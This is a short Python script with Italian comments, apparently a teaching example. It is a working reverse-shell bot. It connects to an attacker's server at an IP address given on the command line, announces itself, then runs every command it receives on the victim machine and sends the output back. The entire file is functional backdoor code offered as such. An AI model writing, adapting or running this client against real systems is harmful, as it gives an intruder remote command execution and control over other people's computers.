import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]        # indirizzo IP dell'hacker passato da linea di comando
serverPort = 8000

#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)             # creazione del socket client
clientSocket.connect((serverName, serverPort))          # connessione al server dell'hacker (passando una tupla)
clientSocket.send('Bot reporting for duty'.encode())    # invio stringa al server codificata in binario

command = clientSocket.recv(4064).decode()              # ricezione comando inviato in binario dal server dell'hacker
while command != 'exit':
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)      # fork del processo corrente e passaggio del comando per esecuzione su client
    result, err = proc.communicate()                                # lettura risultati esecuzione comando su macchina client per successivo invio a hacker
    clientSocket.send(result)
    command = (clientSocket.recv(4064)).decode()

clientSocket.close()